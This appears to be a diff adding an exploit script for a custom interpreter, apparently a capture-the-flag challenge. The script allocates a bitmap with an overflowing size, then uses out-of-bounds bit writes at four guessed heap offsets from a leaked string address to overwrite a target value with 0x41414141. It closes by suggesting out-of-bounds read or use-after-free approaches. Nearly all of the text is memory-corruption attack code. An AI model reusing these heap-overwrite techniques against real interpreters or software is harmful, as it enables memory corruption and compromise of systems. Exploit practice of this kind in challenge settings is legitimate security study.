@@ -1,0 +1,123 @@
+print("=== Comprehensive Offset Test ===");
+
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Testing multiple offset combinations...");
+
+print("Test 1: entry=-0x100, bitmap=-0x1000");
+int entry1 = targetaddr - 256;
+int valueptr1 = entry1 + 40;
+int bitmapptr1 = targetaddr - 4096;
+int offset1 = valueptr1 - bitmapptr1;
+int bitindex1 = offset1 * 8;
+set(b1, bitindex1 + 0, 0, 1);
+set(b1, bitindex1 + 6, 0, 1);
+set(b1, bitindex1 + 8, 0, 1);
+set(b1, bitindex1 + 14, 0, 1);
+set(b1, bitindex1 + 16, 0, 1);
+set(b1, bitindex1 + 22, 0, 1);
+set(b1, bitindex1 + 24, 0, 1);
+set(b1, bitindex1 + 30, 0, 1);
+int test1 = target;
+print("test1:");
+print(test1);
+if (test1 == 1094795585) {
+    print("SUCCESS! entry=-0x100, bitmap=-0x1000");
+}
+
+print("Test 2: entry=-0x200, bitmap=-0x2000");
+int entry2 = targetaddr - 512;
+int valueptr2 = entry2 + 40;
+int bitmapptr2 = targetaddr - 8192;
+int offset2 = valueptr2 - bitmapptr2;
+int bitindex2 = offset2 * 8;
+set(b1, bitindex1 + 0, 0, 0);
+set(b1, bitindex1 + 6, 0, 0);
+set(b1, bitindex1 + 8, 0, 0);
+set(b1, bitindex1 + 14, 0, 0);
+set(b1, bitindex1 + 16, 0, 0);
+set(b1, bitindex1 + 22, 0, 0);
+set(b1, bitindex1 + 24, 0, 0);
+set(b1, bitindex1 + 30, 0, 0);
+set(b1, bitindex2 + 0, 0, 1);
+set(b1, bitindex2 + 6, 0, 1);
+set(b1, bitindex2 + 8, 0, 1);
+set(b1, bitindex2 + 14, 0, 1);
+set(b1, bitindex2 + 16, 0, 1);
+set(b1, bitindex2 + 22, 0, 1);
+set(b1, bitindex2 + 24, 0, 1);
+set(b1, bitindex2 + 30, 0, 1);
+int test2 = target;
+print("test2:");
+print(test2);
+if (test2 == 1094795585) {
+    print("SUCCESS! entry=-0x200, bitmap=-0x2000");
+}
+
+print("Test 3: entry=-0x300, bitmap=-0x1000");
+int entry3 = targetaddr - 768;
+int valueptr3 = entry3 + 40;
+int bitmapptr3 = targetaddr - 4096;
+int offset3 = valueptr3 - bitmapptr3;
+int bitindex3 = offset3 * 8;
+set(b1, bitindex2 + 0, 0, 0);
+set(b1, bitindex2 + 6, 0, 0);
+set(b1, bitindex2 + 8, 0, 0);
+set(b1, bitindex2 + 14, 0, 0);
+set(b1, bitindex2 + 16, 0, 0);
+set(b1, bitindex2 + 22, 0, 0);
+set(b1, bitindex2 + 24, 0, 0);
+set(b1, bitindex2 + 30, 0, 0);
+set(b1, bitindex3 + 0, 0, 1);
+set(b1, bitindex3 + 6, 0, 1);
+set(b1, bitindex3 + 8, 0, 1);
+set(b1, bitindex3 + 14, 0, 1);
+set(b1, bitindex3 + 16, 0, 1);
+set(b1, bitindex3 + 22, 0, 1);
+set(b1, bitindex3 + 24, 0, 1);
+set(b1, bitindex3 + 30, 0, 1);
+int test3 = target;
+print("test3:");
+print(test3);
+if (test3 == 1094795585) {
+    print("SUCCESS! entry=-0x300, bitmap=-0x1000");
+}
+
+print("Test 4: entry=-0x400, bitmap=-0x2000");
+int entry4 = targetaddr - 1024;
+int valueptr4 = entry4 + 40;
+int bitmapptr4 = targetaddr - 8192;
+int offset4 = valueptr4 - bitmapptr4;
+int bitindex4 = offset4 * 8;
+set(b1, bitindex3 + 0, 0, 0);
+set(b1, bitindex3 + 6, 0, 0);
+set(b1, bitindex3 + 8, 0, 0);
+set(b1, bitindex3 + 14, 0, 0);
+set(b1, bitindex3 + 16, 0, 0);
+set(b1, bitindex3 + 22, 0, 0);
+set(b1, bitindex3 + 24, 0, 0);
+set(b1, bitindex3 + 30, 0, 0);
+set(b1, bitindex4 + 0, 0, 1);
+set(b1, bitindex4 + 6, 0, 1);
+set(b1, bitindex4 + 8, 0, 1);
+set(b1, bitindex4 + 14, 0, 1);
+set(b1, bitindex4 + 16, 0, 1);
+set(b1, bitindex4 + 22, 0, 1);
+set(b1, bitindex4 + 24, 0, 1);
+set(b1, bitindex4 + 30, 0, 1);
+int test4 = target;
+print("test4:");
+print(test4);
+if (test4 == 1094795585) {
+    print("SUCCESS! entry=-0x400, bitmap=-0x2000");
+}
+
+print("If none work, addresses might be completely different");
+print("Consider using OOB read or use-after-free approach");
+
